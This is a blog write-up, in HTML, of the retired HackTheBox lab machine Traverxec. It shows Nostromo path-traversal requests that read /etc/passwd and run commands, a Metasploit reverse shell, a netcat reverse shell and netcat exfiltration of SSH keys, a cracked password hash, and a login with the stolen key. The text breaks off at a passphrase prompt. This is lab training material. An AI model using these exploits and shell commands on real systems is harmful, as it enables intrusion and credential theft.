@@ -1,0 +1,312 @@
+<!doctype html><html lang=en><head><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content="DezeStijn"><meta name=description content="Write-up of the Traverxec machine by jkr on HackTheBox.eu."><meta name=keywords content="Sequr,blog,writeup,CTF,challenge,machine,infosec,IT security,hacking,pentesting,cybersecurity,HackTheBox.eu,jkr,Machine,Traverxec"><meta name=robots content="noodp"><meta name=theme-color content="#252627"><link rel=canonical href=https://sequr.be/blog/2020/01/traverxec/><title>Traverxec :: Sequr
+</title><link rel=stylesheet href=https://sequr.be/main.min.244183cde1a38e0b08f82c11791181288f9aac1cc9618cd6f4e9e7710c5768ba.css integrity="sha256-JEGDzeGjjgsI+CwReRGBKI+arBzJYYzW9OnncQxXaLo=" crossorigin=anonymous><link rel=stylesheet type=text/css href=https://sequr.be/css/table.css><link rel=stylesheet type=text/css href=https://sequr.be/css/menu.css><link rel=stylesheet type=text/css href=https://sequr.be/css/background.css><link rel=apple-touch-icon sizes=180x180 href=https://sequr.be/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://sequr.be/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://sequr.be/favicon-16x16.png><link rel=manifest href=https://sequr.be/site.webmanifest><link rel=mask-icon href=https://sequr.be/safari-pinned-tab.svg color><link rel="shortcut icon" href=https://sequr.be/favicon.ico><meta name=msapplication-TileColor content><meta itemprop=name content="Traverxec"><meta itemprop=description content="Write-up of the Traverxec machine by jkr on HackTheBox.eu."><meta itemprop=datePublished content="2020-01-24T16:24:02+00:00"><meta itemprop=dateModified content="2020-01-24T16:24:02+00:00"><meta itemprop=wordCount content="2294"><meta itemprop=image content="https://sequr.be/img/htb-traverxec.png"><meta itemprop=keywords content="HackTheBox.eu,Jkr,Machine,Traverxec"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://sequr.be/img/htb-traverxec.png"><meta name=twitter:title content="Traverxec"><meta name=twitter:description content="Write-up of the Traverxec machine by jkr on HackTheBox.eu."><meta property="article:section" content="Hack The Box"><meta property="article:section" content="Writeup"><meta property="article:published_time" content="2020-01-24 16:24:02 +0000 UTC"><link rel=webmention href=https://webmention.io/sequr.be/webmention></head><body><div class=container><header class=header><span class=header__inner><a href=https://sequr.be/ style=text-decoration:none><div class=logo><span class=logo__mark>$</span>
+<span class=logo__text>lynx sequr.be</span>
+<span class=logo__cursor style=background-color:#e68101></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://sequr.be/about/>About</a></li><li><a href=https://sequr.be/blog/>Blog</a></li><li><a href=https://sequr.be/privacy/>Privacy</a></li><li><a href=https://sequr.be/shoppinglist/>Shopping</a></li></ul></nav><span class=menu-trigger><svg viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span><span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class="post h-entry"><div class=post-info><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+11 minutes</p></div><article><h1 class="post-title p-name"><a href=https://sequr.be/blog/2020/01/traverxec/ class=u-url>Traverxec</a></h1><div class="post-content e-content"><p><strong>Note to fellow-HTBers:</strong> Only write-ups of retired HTB machines or challenges are allowed.</p><h2 id=machine-info>Machine info <a href=#machine-info>¶</a></h2><p>Traverxec [by <a href=https://www.hackthebox.eu/home/users/profile/77141 target=_blank rel=noopener>jkr</a>]<br>IP: 10.10.10.165<br>OS: Linux<br>Difficulty: Easy<br>Release: 16 Nov 2019<br>Retired: 11 April 2020</p><h2 id=recon>Recon <a href=#recon>¶</a></h2><h3 id=nmap>Nmap <a href=#nmap>¶</a></h3><p>As usual we kick off with a nmap scan of the box</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Nmap 7.80 scan initiated Tue Dec 17 15:29:54 2019 as: nmap -v -A -sC -T4 -oA scanning/nmap_traverxec 10.10.10.165</span>
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.10.165
+</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.027s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> filtered ports
+</span></span><span style=display:flex><span>PORT  STATE SERVICE VERSION
+</span></span><span style=display:flex><span>22/tcp open ssh   OpenSSH 7.9p1 Debian 10+deb10u1 <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| ssh-hostkey: 
+</span></span><span style=display:flex><span>|  <span style=color:#ae81ff>2048</span> aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|  <span style=color:#ae81ff>256</span> 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|_ <span style=color:#ae81ff>256</span> 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>80/tcp open http  nostromo 1.9.6
+</span></span><span style=display:flex><span>|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
+</span></span><span style=display:flex><span>| http-methods: 
+</span></span><span style=display:flex><span>|_ Supported Methods: GET HEAD POST
+</span></span><span style=display:flex><span>|_http-server-header: nostromo 1.9.6
+</span></span><span style=display:flex><span>|_http-title: <span style=color:#e6db74>&#34;TRAVERXEC&#34;</span>
+</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span><span style=color:#75715e># Nmap done at Tue Dec 17 15:30:12 2019 -- 1 IP address (1 host up) scanned in 17.43 seconds</span>
+</span></span></code></pre></div><p>Ports 22 and 80 are open.<br>Let&rsquo;s start with checking the website.</p><p>The website doesn&rsquo;t show much. It looks like someone is still working on building an online portfolio.</p><p>However, it looks like the site is running Nostromo 1.9.6 as webserver. You can see this in the nmap output, as well as on the error pages, e.g. when looking for a non-existing file and getting a 404.<br>Note that my screenshot shows <code>traverxec.htb</code> as hostname instead of the IP, this is because I added a static binding in my <code>/etc/hosts</code> file.</p><figure class=center><img src=https://sequr.be/img/htb-traverxec-img1.png><figcaption class=center>404 error revealing server technology</figcaption></figure><h3 id=initial-foothold>Initial foothold <a href=#initial-foothold>¶</a></h3><p>Looking at the <a href=https://www.exploit-db.com/%22 target=_blank rel=noopener>Exploit Database</a> or <code>searchsploit</code>, we find some potential exploits for the Nostromo webserver.<br>The <a href=https://www.exploit-db.com/exploits/47573%22 target=_blank rel=noopener>Directory Traversal Remote Code Exection</a> looks particularly interesting. It even has a metasploit module available.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$searchsploit nostromo
+</span></span><span style=display:flex><span>--------------------------------------------------------------------------- ----------------------------------------
+</span></span><span style=display:flex><span> Exploit Title                                                             |  Path
+</span></span><span style=display:flex><span>                                                                           | <span style=color:#f92672>(</span>/usr/share/exploitdb/<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>--------------------------------------------------------------------------- ----------------------------------------
+</span></span><span style=display:flex><span>Nostromo - Directory Traversal Remote Command Execution <span style=color:#f92672>(</span>Metasploit<span style=color:#f92672>)</span>       | exploits/multiple/remote/47573.rb
+</span></span><span style=display:flex><span>nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution       | exploits/linux/remote/35466.sh
+</span></span><span style=display:flex><span>--------------------------------------------------------------------------- ----------------------------------------
+</span></span></code></pre></div><p>Looking at the code, it seems like the issues is caused because the server doesn&rsquo;t properly handle null bytes. If you manually try to browse to e.g. <code>../../../../../etc/passwd</code> the server will refuse to do so and stay at <code>/</code>, but if you use null bytes, it doesn&rsquo;t properly clean the URL.</p><p>We can test this in a proxy tool like Burp. Although this would even work in something like cURL.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010># REQUEST
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span><span style=color:#a6e22e>GET</span> /.%0d./.%0d./.%0d./.%0d./etc/passwd <span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span>
+</span></span><span style=display:flex><span>Host<span style=color:#f92672>:</span> <span style=color:#ae81ff>10.10.10.165</span>
+</span></span><span style=display:flex><span>User-Agent<span style=color:#f92672>:</span> <span style=color:#ae81ff>Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0</span>
+</span></span><span style=display:flex><span>Accept<span style=color:#f92672>:</span> <span style=color:#ae81ff>*/*</span>
+</span></span><span style=display:flex><span>Accept-Language<span style=color:#f92672>:</span> <span style=color:#ae81ff>en-US,en;q=0.5</span>
+</span></span><span style=display:flex><span>Accept-Encoding<span style=color:#f92672>:</span> <span style=color:#ae81ff>gzip, deflate</span>
+</span></span><span style=display:flex><span>Connection<span style=color:#f92672>:</span> <span style=color:#ae81ff>close</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span># RESPONSE
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>HTTP/1.1 200 OK
+</span></span><span style=display:flex><span>Date: Tue, 17 Dec 2019 15:44:59 GMT
+</span></span><span style=display:flex><span>Server: nostromo 1.9.6
+</span></span><span style=display:flex><span>Connection: close
+</span></span><span style=display:flex><span>Last-Modified: Fri, 25 Oct 2019 18:34:30 GMT
+</span></span><span style=display:flex><span>Content-Length: 1395
+</span></span><span style=display:flex><span>Content-Type: text/html
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style=display:flex><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span style=display:flex><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span style=display:flex><span>[...]
+</span></span><span style=display:flex><span>david:x:1000:1000:david,,,:/home/david:/bin/bash
+</span></span><span style=display:flex><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span></code></pre></div><p>The request above works to retrieve a file. With the one below we can even execute shell commands.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#960050;background-color:#1e0010># REQUEST
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span><span style=color:#a6e22e>POST</span> /.%0d./.%0d./.%0d./.%0d./bin/sh <span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span>
+</span></span><span style=display:flex><span>Host<span style=color:#f92672>:</span> <span style=color:#ae81ff>10.10.10.165</span>
+</span></span><span style=display:flex><span>User-Agent<span style=color:#f92672>:</span> <span style=color:#ae81ff>Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0</span>
+</span></span><span style=display:flex><span>Accept<span style=color:#f92672>:</span> <span style=color:#ae81ff>*/*</span>
+</span></span><span style=display:flex><span>Accept-Language<span style=color:#f92672>:</span> <span style=color:#ae81ff>en-US,en;q=0.5</span>
+</span></span><span style=display:flex><span>Accept-Encoding<span style=color:#f92672>:</span> <span style=color:#ae81ff>gzip, deflate</span>
+</span></span><span style=display:flex><span>Connection<span style=color:#f92672>:</span> <span style=color:#ae81ff>close</span>
+</span></span><span style=display:flex><span>Content-Length<span style=color:#f92672>:</span> <span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ls
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span># RESPONSE
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>HTTP/1.1 200 OK
+</span></span><span style=display:flex><span>Date: Tue, 17 Dec 2019 15:47:33 GMT
+</span></span><span style=display:flex><span>Server: nostromo 1.9.6
+</span></span><span style=display:flex><span>Connection: close
+</span></span><span style=display:flex><span>2to3-2.7
+</span></span><span style=display:flex><span>[
+</span></span><span style=display:flex><span>apt-listchanges
+</span></span><span style=display:flex><span>apt-mark
+</span></span><span style=display:flex><span>apt-sortpkgs
+</span></span><span style=display:flex><span>[...]
+</span></span><span style=display:flex><span>zipinfo
+</span></span><span style=display:flex><span>zless
+</span></span><span style=display:flex><span>zmore
+</span></span><span style=display:flex><span>znew
+</span></span></code></pre></div><p>To make it a bit easier on ourselves, we can use the metasploit module instead.</p><p>First copy the exploit to the local metasploit &ldquo;add-on&rdquo; exploits folder.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ sudo mkdir -p /root/.msf4/modules/exploits/multiple/remote/
+</span></span><span style=display:flex><span>$ sudo cp /usr/share/exploitdb/exploits/multiple/remote/47573.rb /root/.msf4/modules/exploits/multiple/remote/
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$ sudo msfconsole
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>msf5 &gt; reload_all
+</span></span><span style=display:flex><span>msf5 &gt; search <span style=color:#ae81ff>47573</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Matching Modules
+</span></span><span style=display:flex><span><span style=color:#f92672>================</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>   <span style=color:#75715e>#  Name                           Disclosure Date  Rank  Check  Description</span>
+</span></span><span style=display:flex><span>   -  ----                           ---------------  ----  -----  -----------
+</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0</span>  exploit/multiple/remote/47573  2019-10-20       good  Yes    Nostromo Directory Traversal Remote Command Execution
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>msf5 &gt; use <span style=color:#ae81ff>0</span>
+</span></span></code></pre></div><p>Then configure the exploit with the correct parameters. Being the IP of the target as RHOSTS and our IP as the LHOST.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multiple/remote/47573<span style=color:#f92672>)</span> &gt; show options
+</span></span><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multiple/remote/47573<span style=color:#f92672>)</span> &gt; set RHOSTS 10.10.10.165
+</span></span><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multiple/remote/47573<span style=color:#f92672>)</span> &gt; set SRVHOST 10.10.14.180
+</span></span><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multiple/remote/47573<span style=color:#f92672>)</span> &gt; set LHOST 10.10.14.180
+</span></span></code></pre></div><p>Running the exploit gives us a shell as the webserver user.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multiple/remote/47573<span style=color:#f92672>)</span> &gt; run
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on 10.10.14.180:4444 
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Configuring Automatic <span style=color:#f92672>(</span>Unix In-Memory<span style=color:#f92672>)</span> target
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending cmd/unix/reverse_perl command payload
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Command shell session <span style=color:#ae81ff>2</span> opened <span style=color:#f92672>(</span>10.10.14.180:4444 -&gt; 10.10.10.165:33620<span style=color:#f92672>)</span> at 2019-12-17 17:56:38 +0100
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>id
+</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
+</span></span></code></pre></div><p>We can get a bit of a cleaner shell using a netcat listener.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Attacker side</span>
+</span></span><span style=display:flex><span>$ nc -lvnp <span style=color:#ae81ff>1337</span>
+</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1337</span> ...
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Victim side</span>
+</span></span><span style=display:flex><span>nc -v 10.10.14.180 <span style=color:#ae81ff>1337</span> -e /bin/bash
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Attacker side</span>
+</span></span><span style=display:flex><span>python -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;);&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Ctrl+Z (background this process)</span>
+</span></span><span style=display:flex><span>$ stty raw -echo
+</span></span><span style=display:flex><span>$ fg <span style=color:#75715e># Re-actve netcat process</span>
+</span></span><span style=display:flex><span>www-data@traverxec:/usr/bin$ export TERM<span style=color:#f92672>=</span>xterm
+</span></span></code></pre></div><h2 id=pivot-to-user>Pivot to user <a href=#pivot-to-user>¶</a></h2><p>Next we do some recon as the webserver user as to find a way to gain access to the target user.</p><p>Using a tool like linEnum gives us a good view of where to start. For example, one of the findings is the following file containing a password (hash).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> htpasswd found - could contain passwords:
+</span></span><span style=display:flex><span>/var/nostromo/conf/.htpasswd
+</span></span><span style=display:flex><span>david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
+</span></span></code></pre></div><p>Cracking this password is fairly easy since it&rsquo;s basically just an MD5 hash.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ cat htpasswd 
+</span></span><span style=display:flex><span>david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$ john --wordlist<span style=color:#f92672>=</span>/usr/share/wordlists/rockyou.txt htpasswd
+</span></span><span style=display:flex><span>Warning: detected hash type <span style=color:#e6db74>&#34;md5crypt&#34;</span>, but the string is also recognized as <span style=color:#e6db74>&#34;md5crypt-long&#34;</span>
+</span></span><span style=display:flex><span>Use the <span style=color:#e6db74>&#34;--format=md5crypt-long&#34;</span> option to force loading these as that type instead
+</span></span><span style=display:flex><span>Using default input encoding: UTF-8
+</span></span><span style=display:flex><span>Loaded <span style=color:#ae81ff>1</span> password hash <span style=color:#f92672>(</span>md5crypt, crypt<span style=color:#f92672>(</span>3<span style=color:#f92672>)</span> $1$ <span style=color:#f92672>(</span>and variants<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>MD5 256/256 AVX2 8x3<span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>Will run <span style=color:#ae81ff>4</span> OpenMP threads
+</span></span><span style=display:flex><span>Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
+</span></span><span style=display:flex><span>Nowonly4me    <span style=color:#f92672>(</span>david<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>1g 0:00:00:40 DONE <span style=color:#f92672>(</span>2020-01-23 17:53<span style=color:#f92672>)</span> 0.02469g/s 261195p/s 261195c/s 261195C/s Noyoudo..Nous4<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span>
+</span></span><span style=display:flex><span>Use the <span style=color:#e6db74>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style=display:flex><span>Session completed
+</span></span></code></pre></div><p>Let&rsquo;s check the rest of the Nostromo configuration to see where we might be able to use this password an/or if there are any hidden folders on the website.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>www-data@traverxec:/var/nostromo$ cd /var/nostromo
+</span></span><span style=display:flex><span>www-data@traverxec:/var/nostromo$ cat conf/nhttpd.conf
+</span></span><span style=display:flex><span><span style=color:#75715e># MAIN [MANDATORY]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>servername              traverxec.htb
+</span></span><span style=display:flex><span>serverlisten            *
+</span></span><span style=display:flex><span>serveradmin             david@traverxec.htb
+</span></span><span style=display:flex><span>serverroot              /var/nostromo
+</span></span><span style=display:flex><span>servermimes             conf/mimes
+</span></span><span style=display:flex><span>docroot                 /var/nostromo/htdocs
+</span></span><span style=display:flex><span>docindex                index.html
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># LOGS [OPTIONAL]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>logpid                  logs/nhttpd.pid
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># SETUID [RECOMMENDED]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>user                    www-data
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># BASIC AUTHENTICATION [OPTIONAL]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>htaccess                .htaccess
+</span></span><span style=display:flex><span>htpasswd                /var/nostromo/conf/.htpasswd
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># ALIASES [OPTIONAL]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>/icons                  /var/nostromo/icons
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># HOMEDIRS [OPTIONAL]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>homedirs                /home
+</span></span><span style=display:flex><span>homedirs_public         public_www
+</span></span></code></pre></div><p>We can check the <a href="https://www.gsp.com/cgi-bin/man.cgi?section=8&amp;topic=nhttpd%22" target=_blank rel=noopener>Nostromo manual pages</a> to see what each of these configuration settings actually do.</p><p>The final section of this configuration is of most value to us, by the looks of it.</p><blockquote><p>HOMEDIRS</p><p>To serve the home directories of your users via HTTP, enable the <strong>homedirs</strong> option by defining the path in where the home directories are stored, normally /home. To access a users home directory enter a ~ in the URL followed by the home directory name like in this example:<br><a href=http://www.nazgul.ch/~hacki/ target=_blank rel=noopener>http://www.nazgul.ch/~hacki/</a></p><p>The content of the home directory is handled exactly the same way as a directory in your document root. If some users don&rsquo;t want that their home directory can be accessed via HTTP, they shall remove the world readable flag on their home directory and a caller will receive a 403 Forbidden response. Also, if basic authentication is enabled, a user can create an .htaccess file in his home directory and a caller will need to authenticate.</p><p>You can restrict the access within the home directories to a single sub directory by defining it via the <strong>homedirs_public</strong> option.</p><p>~ Nostromo webserver manual page</p></blockquote><p>This means we should be able to visit the home directory of David via the website using <code>~david</code> as path.</p><p>Visting <a href=http://traverxec.htb/~david/ target=_blank rel=noopener>http://traverxec.htb/~david/</a> gives us the following view:</p><figure class=center><img src=https://sequr.be/img/htb-traverxec-img2.png></figure><p>Bruteforcing this web directory doesn&rsquo;t give us anything. Nor are we ever asked to authenticate using Basic Authentication, so we have no use for the previously cracked password.</p><p>It looks like we need to find a different way to get to useful data.</p><p>Since <code>homedirs_public</code> is defined in the Nostromo config to be <code>public_www</code>, this means we&rsquo;re actually seeing the contents of <code>/home/david/public_www</code>. Let&rsquo;s visit that folder via our shell, assuming our webserver user is supposed to have access to this folder.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>www-data@traverxec:/usr/bin$ cd /home
+</span></span><span style=display:flex><span>cd /home
+</span></span><span style=display:flex><span>www-data@traverxec:/home$ ls
+</span></span><span style=display:flex><span>ls
+</span></span><span style=display:flex><span>david
+</span></span><span style=display:flex><span>www-data@traverxec:/home$ cd david
+</span></span><span style=display:flex><span>cd david
+</span></span><span style=display:flex><span>www-data@traverxec:/home/david$ ls
+</span></span><span style=display:flex><span>ls
+</span></span><span style=display:flex><span>ls: cannot open directory <span style=color:#e6db74>&#39;.&#39;</span>: Permission denied
+</span></span><span style=display:flex><span>www-data@traverxec:/home/david$ cd public_www
+</span></span><span style=display:flex><span>cd public_www
+</span></span><span style=display:flex><span>www-data@traverxec:/home/david/public_www$ ls
+</span></span><span style=display:flex><span>ls
+</span></span><span style=display:flex><span>index.html  protected-file-area
+</span></span><span style=display:flex><span>www-data@traverxec:/home/david/public_www$ cd protected-file-area
+</span></span><span style=display:flex><span>cd protected-file-area
+</span></span><span style=display:flex><span>www-data@traverxec:/home/david/public_www/protected-file-area$ ls
+</span></span><span style=display:flex><span>ls
+</span></span><span style=display:flex><span>backup-ssh-identity-files.tgz
+</span></span></code></pre></div><p>We might not be able to see the contents of David&rsquo;s home folder, but we do have access to the <code>public_www</code> folder in there. In this folder we find a <code>protected-file-area</code> with what seems to be a backup of David&rsquo;s SSH keys.</p><p>Let&rsquo;s copy this backup to our local machine for further investigation.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Set up listener on own system</span>
+</span></span><span style=display:flex><span>$ nc -lvp <span style=color:#ae81ff>1337</span> &gt; backup-ssh-identity-files.tgz
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Copy file from target to own system</span>
+</span></span><span style=display:flex><span>www-data@traverxec:/home/david/public_www/protected-file-area$ cat backup-ssh-identity-files.tgz | nc -q <span style=color:#ae81ff>0</span> 10.10.14.225 <span style=color:#ae81ff>1337</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ tar -xzvf backup-ssh-identity-files.tgz 
+</span></span><span style=display:flex><span>home/david/.ssh/
+</span></span><span style=display:flex><span>home/david/.ssh/authorized_keys
+</span></span><span style=display:flex><span>home/david/.ssh/id_rsa
+</span></span><span style=display:flex><span>home/david/.ssh/id_rsa.pub
+</span></span></code></pre></div><p>We appear to have gotten our hands on the private key of David, which should allow us to SSH into the box using his username and key.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ ssh -i home/david/.ssh/id_rsa david@traverxec.htb
+</span></span><span style=display:flex><span>The authenticity of host <span style=color:#e6db74>&#39;traverxec.htb (10.10.10.165)&#39;</span> can<span style=color:#e6db74>&#39;t be established.
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>ECDSA key fingerprint is SHA256:CiO/pUMzd+6bHnEhA2rAU30QQiNdWOtkEPtJoXnWzVo.
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Warning: Permanently added &#39;</span>traverxec.htb,10.10.10.165<span style=color:#e6db74>&#39; (ECDSA) to the list of known hosts.
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Enter passphrase for key &#39;</span>home/david/.ssh/id_rsa<span style=color:#960050;background-color:#1e0010>&#39;</span>:
